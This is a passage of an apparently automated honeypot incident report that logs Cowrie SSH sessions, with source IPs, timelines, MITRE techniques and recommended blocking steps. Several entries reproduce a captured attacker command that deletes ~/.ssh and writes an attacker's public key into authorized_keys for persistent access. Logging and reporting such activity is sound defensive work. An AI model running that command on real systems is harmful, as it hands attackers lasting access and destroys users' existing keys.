**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:54:53` | `cowrie.session.connect` |
| `2026-05-26 06:54:53` | `cowrie.client.version` |
| `2026-05-26 06:54:53` | `cowrie.client.kex` |
| `2026-05-26 06:54:54` | `cowrie.login.success` |
| `2026-05-26 06:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cf12899098f

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:57 |
| **Last Seen** | 2026-05-26 06:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:57:44` | `cowrie.session.connect` |
| `2026-05-26 06:57:44` | `cowrie.client.version` |
| `2026-05-26 06:57:44` | `cowrie.client.kex` |
| `2026-05-26 06:57:45` | `cowrie.login.success` |
| `2026-05-26 06:57:45` | `cowrie.session.params` |
| `2026-05-26 06:57:45` | `cowrie.command.input` |
| `2026-05-26 06:57:45` | `cowrie.command.failed` |
| `2026-05-26 06:57:45` | `cowrie.log.closed` |
| `2026-05-26 06:57:45` | `cowrie.session.params` |
| `2026-05-26 06:57:45` | `cowrie.command.input` |
| `2026-05-26 06:57:45` | `cowrie.session.file_download` |
| `2026-05-26 06:57:45` | `cowrie.log.closed` |
| `2026-05-26 06:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ff2fbc11f4b

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-26 06:57 |
| **Last Seen** | 2026-05-26 06:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 06:57:47` | `cowrie.session.connect` |
| `2026-05-26 06:57:47` | `cowrie.client.version` |
| `2026-05-26 06:57:47` | `cowrie.client.kex` |
| `2026-05-26 06:57:47` | `cowrie.login.success` |
| `2026-05-26 06:57:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1487bc259470

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 07:03 |
| **Last Seen** | 2026-05-26 07:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:03:12` | `cowrie.session.connect` |
| `2026-05-26 07:03:12` | `cowrie.client.version` |
| `2026-05-26 07:03:12` | `cowrie.client.kex` |
| `2026-05-26 07:03:13` | `cowrie.login.success` |
| `2026-05-26 07:03:14` | `cowrie.session.params` |
| `2026-05-26 07:03:14` | `cowrie.command.input` |
| `2026-05-26 07:03:14` | `cowrie.command.failed` |
| `2026-05-26 07:03:15` | `cowrie.log.closed` |
| `2026-05-26 07:03:15` | `cowrie.session.params` |
| `2026-05-26 07:03:15` | `cowrie.command.input` |
| `2026-05-26 07:03:15` | `cowrie.session.file_download` |
| `2026-05-26 07:03:15` | `cowrie.log.closed` |
| `2026-05-26 07:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5b0efb4671c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-26 07:03 |
| **Last Seen** | 2026-05-26 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:03:19` | `cowrie.session.connect` |
| `2026-05-26 07:03:19` | `cowrie.client.version` |
| `2026-05-26 07:03:19` | `cowrie.client.kex` |
| `2026-05-26 07:03:20` | `cowrie.login.success` |
| `2026-05-26 07:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7515f7196048

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:17 |
| **Last Seen** | 2026-05-26 07:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:17:45` | `cowrie.session.connect` |
| `2026-05-26 07:17:45` | `cowrie.client.version` |
| `2026-05-26 07:17:46` | `cowrie.client.kex` |
| `2026-05-26 07:17:46` | `cowrie.login.success` |
| `2026-05-26 07:17:47` | `cowrie.session.params` |
| `2026-05-26 07:17:47` | `cowrie.command.input` |
| `2026-05-26 07:17:47` | `cowrie.command.failed` |
| `2026-05-26 07:17:47` | `cowrie.log.closed` |
| `2026-05-26 07:17:47` | `cowrie.session.params` |
| `2026-05-26 07:17:47` | `cowrie.command.input` |
| `2026-05-26 07:17:47` | `cowrie.session.file_download` |
| `2026-05-26 07:17:47` | `cowrie.log.closed` |
| `2026-05-26 07:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b163f0ec1d98

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:17 |
| **Last Seen** | 2026-05-26 07:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:17:50` | `cowrie.session.connect` |
| `2026-05-26 07:17:50` | `cowrie.client.version` |
| `2026-05-26 07:17:50` | `cowrie.client.kex` |
| `2026-05-26 07:17:51` | `cowrie.login.success` |
| `2026-05-26 07:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cee1b4026db0

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:18 |
| **Last Seen** | 2026-05-26 07:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:18:34` | `cowrie.session.connect` |
| `2026-05-26 07:18:34` | `cowrie.client.version` |
| `2026-05-26 07:18:35` | `cowrie.client.kex` |
| `2026-05-26 07:18:35` | `cowrie.login.success` |
| `2026-05-26 07:18:36` | `cowrie.session.params` |
| `2026-05-26 07:18:36` | `cowrie.command.input` |
| `2026-05-26 07:18:36` | `cowrie.command.failed` |
| `2026-05-26 07:18:36` | `cowrie.log.closed` |
| `2026-05-26 07:18:36` | `cowrie.session.params` |
| `2026-05-26 07:18:36` | `cowrie.command.input` |
| `2026-05-26 07:18:36` | `cowrie.session.file_download` |
| `2026-05-26 07:18:36` | `cowrie.log.closed` |
| `2026-05-26 07:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c483e619ed3

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:18 |
| **Last Seen** | 2026-05-26 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:18:39` | `cowrie.session.connect` |
| `2026-05-26 07:18:39` | `cowrie.client.version` |
| `2026-05-26 07:18:39` | `cowrie.client.kex` |
| `2026-05-26 07:18:40` | `cowrie.login.success` |
| `2026-05-26 07:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ea5f0d0ac9a

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:19 |
| **Last Seen** | 2026-05-26 07:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:19:01` | `cowrie.session.connect` |
| `2026-05-26 07:19:01` | `cowrie.client.version` |
| `2026-05-26 07:19:01` | `cowrie.client.kex` |
| `2026-05-26 07:19:02` | `cowrie.login.success` |
| `2026-05-26 07:19:03` | `cowrie.session.params` |
| `2026-05-26 07:19:03` | `cowrie.command.input` |
| `2026-05-26 07:19:03` | `cowrie.command.failed` |
| `2026-05-26 07:19:03` | `cowrie.log.closed` |
| `2026-05-26 07:19:03` | `cowrie.session.params` |
| `2026-05-26 07:19:03` | `cowrie.command.input` |
| `2026-05-26 07:19:03` | `cowrie.session.file_download` |
| `2026-05-26 07:19:03` | `cowrie.log.closed` |
| `2026-05-26 07:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60502038cacb

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:19 |
| **Last Seen** | 2026-05-26 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:19:06` | `cowrie.session.connect` |
| `2026-05-26 07:19:06` | `cowrie.client.version` |
| `2026-05-26 07:19:06` | `cowrie.client.kex` |
| `2026-05-26 07:19:07` | `cowrie.login.success` |
| `2026-05-26 07:19:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0638894cca

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:20 |
| **Last Seen** | 2026-05-26 07:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:20:27` | `cowrie.session.connect` |
| `2026-05-26 07:20:27` | `cowrie.client.version` |
| `2026-05-26 07:20:27` | `cowrie.client.kex` |
| `2026-05-26 07:20:28` | `cowrie.login.success` |
| `2026-05-26 07:20:29` | `cowrie.session.params` |
| `2026-05-26 07:20:29` | `cowrie.command.input` |
| `2026-05-26 07:20:29` | `cowrie.command.failed` |
| `2026-05-26 07:20:29` | `cowrie.log.closed` |
| `2026-05-26 07:20:29` | `cowrie.session.params` |
| `2026-05-26 07:20:29` | `cowrie.command.input` |
| `2026-05-26 07:20:29` | `cowrie.session.file_download` |
| `2026-05-26 07:20:29` | `cowrie.log.closed` |
| `2026-05-26 07:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bd27fca5f4f

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:20 |
| **Last Seen** | 2026-05-26 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:20:32` | `cowrie.session.connect` |
| `2026-05-26 07:20:32` | `cowrie.client.version` |
| `2026-05-26 07:20:32` | `cowrie.client.kex` |
| `2026-05-26 07:20:33` | `cowrie.login.success` |
| `2026-05-26 07:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb86bfdc2969

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:21 |
| **Last Seen** | 2026-05-26 07:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:21:32` | `cowrie.session.connect` |
| `2026-05-26 07:21:32` | `cowrie.client.version` |
| `2026-05-26 07:21:32` | `cowrie.client.kex` |
| `2026-05-26 07:21:33` | `cowrie.login.success` |
| `2026-05-26 07:21:34` | `cowrie.session.params` |
| `2026-05-26 07:21:34` | `cowrie.command.input` |
| `2026-05-26 07:21:34` | `cowrie.command.failed` |
| `2026-05-26 07:21:34` | `cowrie.log.closed` |
| `2026-05-26 07:21:34` | `cowrie.session.params` |
| `2026-05-26 07:21:34` | `cowrie.command.input` |
| `2026-05-26 07:21:34` | `cowrie.session.file_download` |
| `2026-05-26 07:21:34` | `cowrie.log.closed` |
| `2026-05-26 07:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039f4177d712

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:21 |
| **Last Seen** | 2026-05-26 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:21:37` | `cowrie.session.connect` |
| `2026-05-26 07:21:37` | `cowrie.client.version` |
| `2026-05-26 07:21:37` | `cowrie.client.kex` |
| `2026-05-26 07:21:38` | `cowrie.login.success` |
| `2026-05-26 07:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0678c2d30142

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:21 |
| **Last Seen** | 2026-05-26 07:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:21:54` | `cowrie.session.connect` |
| `2026-05-26 07:21:54` | `cowrie.client.version` |
| `2026-05-26 07:21:54` | `cowrie.client.kex` |
| `2026-05-26 07:21:54` | `cowrie.login.success` |
| `2026-05-26 07:21:55` | `cowrie.session.params` |
| `2026-05-26 07:21:55` | `cowrie.command.input` |
| `2026-05-26 07:21:55` | `cowrie.command.failed` |
| `2026-05-26 07:21:55` | `cowrie.log.closed` |
| `2026-05-26 07:21:55` | `cowrie.session.params` |
| `2026-05-26 07:21:55` | `cowrie.command.input` |
| `2026-05-26 07:21:56` | `cowrie.session.file_download` |
| `2026-05-26 07:21:56` | `cowrie.log.closed` |
| `2026-05-26 07:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e2dac328e5b

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:21 |
| **Last Seen** | 2026-05-26 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 07:21:58` | `cowrie.session.connect` |
| `2026-05-26 07:21:58` | `cowrie.client.version` |
| `2026-05-26 07:21:58` | `cowrie.client.kex` |
| `2026-05-26 07:21:59` | `cowrie.login.success` |
| `2026-05-26 07:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-882f18f0652a

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-26 07:22 |
| **Last Seen** | 2026-05-26 07:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
